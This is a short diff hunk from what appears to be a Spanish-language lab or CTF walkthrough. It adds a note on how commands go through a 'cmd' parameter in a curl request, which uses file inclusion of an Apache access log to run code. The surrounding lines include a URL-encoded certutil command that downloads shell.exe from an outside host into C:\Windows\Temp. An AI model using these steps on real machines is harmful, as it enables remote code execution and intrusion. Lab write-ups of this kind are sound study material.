@@ -189,6 +189,9 @@ certutil+-urlcache+-f+http%3A%2F%2F192.168.1.47%2Fshell.exe+C%3A%5CWindows%5CTem
 ```
 ![TECH](images/tech/21.png)
 
+
+No hay que recordar que las instrucciones van detrás del cmd `curl -sX GET "http://192.168.1.46/page.php?i=c:\xampp\apache\logs\techro-events\access.log&cmd=AQUI LA INSTRUCCION"`
+
 comprobamos que se ha subido con:
 ```bash
 dir C:\Windows\Temp
